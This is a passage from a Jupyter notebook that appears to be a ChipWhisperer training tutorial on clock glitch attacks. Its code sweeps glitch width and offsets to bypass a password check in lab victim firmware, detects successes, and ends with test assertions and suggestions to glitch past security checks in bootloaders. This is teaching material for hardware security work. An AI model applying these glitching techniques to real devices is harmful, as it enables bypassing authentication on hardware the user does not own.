    "awk '{gsub(/glitch1\\(\\)/, \"glitch3()\")}1' glitchsimple.c > tmp.c 2>/dev/null\n",
    "rm glitchsimple.c\n",
    "mv tmp.c glitchsimple.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$CRYPTO_TARGET\"\n",
    "cd ../../hardware/victims/firmware/glitch-simple-lab1\n",
    "make PLATFORM=$1 CRYPTO_TARGET=$2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "cw.programTarget(scope, prog, fw_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now let's make sure we can communicate with the password check with a successful password:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.arm()\n",
    "target.ser.write(\"touch\\n\")\n",
    "\n",
    "ret = scope.capture()\n",
    "if ret:\n",
    "    print(\"Scope capture timed out\")\n",
    "num_chars = target.ser.inWaiting()\n",
    "response = target.ser.read(num_chars, timeout = 10)\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "and an unsuccessful one:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.arm()\n",
    "target.ser.write(\"x\\n\")\n",
    "\n",
    "ret = scope.capture()\n",
    "if ret:\n",
    "    print(\"Scope capture timed out\")\n",
    "num_chars = target.ser.inWaiting()\n",
    "response = target.ser.read(num_chars, timeout = 10)\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "One thing that you may have run into in the previous part is that using a large repeat value makes the target more likely to crash. As mentioned in the previous part, we can use smaller ranges of offset and width, use a repeat value of 1, and iterate through the external offset instead to get a successful glitch. This is often a much more reliable way to glitch targets.\n",
    "\n",
    "One other thing we need to consider is crashing. In the previous part, we didn't need to worry about crashing since we always reset after a glitch attempt anyway. This is no longer true. Instead we'll need to detect glitches and, if they happen, reset the target. Typically a good way to detect crashes is by running through the loop again and looking for a timeout. This is rather slow, but for this attack, we don't really have a better method. One thing we can do to speed this up is to decrease the adc timeout value (via `scope.adc.timeout`). Resetting is the same in the last part.\n",
    "\n",
    "Putting it all together (don't forget to update the width and offset with ranges that worked in the last part):"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Attack Loop"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "scope.glitch.clk_src = \"clkgen\"\n",
    "scope.glitch.output = \"clock_xor\"\n",
    "scope.glitch.trigger_src = \"ext_single\"\n",
    "scope.glitch.repeat = 1\n",
    "scope.glitch.ext_offset = 0\n",
    "scope.io.hs2 = \"glitch\"\n",
    "\n",
    "target.init()\n",
    "attack2_data = []\n",
    "scope.adc.timeout = 0.1\n",
    "offset_range = Range(-41, -35, 1)\n",
    "width_range = Range(-10, -5, 1)\n",
    "\n",
    "scope.glitch.width = width_range.min\n",
    "while scope.glitch.width < width_range.max:\n",
    "    scope.glitch.offset = offset_range.min\n",
    "    while scope.glitch.offset < offset_range.max:\n",
    "        for i in range(0, 20):\n",
    "            scope.glitch.ext_offset = i\n",
    "            # call before trace things here\n",
    "\n",
    "            # flush the garbage from the computer's target read buffer\n",
    "            target.ser.flush()\n",
    "\n",
    "            # run aux stuff that should run before the scope arms here\n",
    "\n",
    "            scope.arm()\n",
    "            target.ser.write(\"x\\n\")\n",
    "\n",
    "            timeout = 50\n",
    "            # wait for target to finish\n",
    "            while target.isDone() is False and timeout:\n",
    "                timeout -= 1\n",
    "                time.sleep(0.01)\n",
    "\n",
    "            try:\n",
    "                ret = scope.capture()\n",
    "                if ret:\n",
    "                    print('Timeout happened during acquisition')\n",
    "                    reset_target(scope)\n",
    "            except IOError as e:\n",
    "                print('IOError: %s' % str(e))\n",
    "\n",
    "            # get the results from the scope\n",
    "            # read from the targets buffer\n",
    "            num_chars = target.ser.inWaiting()\n",
    "            response = target.ser.read(num_chars, timeout = 10)\n",
    "\n",
    "            # for table display purposes\n",
    "            success = 'Welcome' in repr(response) # check for glitch success (depends on targets active firmware)\n",
    "            attack2_data.append([scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset, success, repr(response)]) \n",
    "\n",
    "            # run aux stuff that should happen after trace here\n",
    "        scope.glitch.offset += offset_range.step\n",
    "    scope.glitch.width += width_range.step\n",
    "print(\"Done glitching\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(scope.adc.trig_count)\n",
    "for row in attack2_data:\n",
    "    if row[3]:\n",
    "        print(row)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "With any luck, you should have some successful attacks. If you weren't able to glitch the target, you may want to try a larger range of width/offset values. You may also want to try decreasing the step value for these ranges as well.\n",
    "\n",
    "With the tutorial now over, we should disconnect from the ChipWhisperer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Glitching Onward"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This basic tutorial has introduced you to glitch attacks. They are a powerful tool for bypassing authentication in embedded hardware devices. There are many ways to expand your knowledge with additional practice, such as:\n",
    "\n",
    "* Manual glitches can be triggered by calling `scope.glitch.manualTrigger()` and `scope.glitch.trigger_src = \"manual\"`. Try using manual glitches to simply glitch past the prompt in `glitch3()`.\n",
    "* Completing the VCC Glitch Attacks tutorial (not yet available), which introduces glitching via voltage instead of the clock.\n",
    "* Download some example source code (bootloaders, login prompts, etc) and port them to your target. See how you can glitch past security checks.\n",
    "* Use one of the IO triggers discussed in Tutorial_A1_Synchronization_to_Communication_Lines."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "success = False\n",
    "for row in attack1_data:\n",
    "    if row[2] > 0:\n",
    "        success = True\n",
    "assert success, \"Failed to glitch attack 1\\n{}\".format(attack1_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "success = False\n",
    "for row in attack2_data:\n",
    "    if row[3]:\n",
    "        success = True\n",
    "assert success, \"Failed to glitch attack 2\\n{}\".format(attack2_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
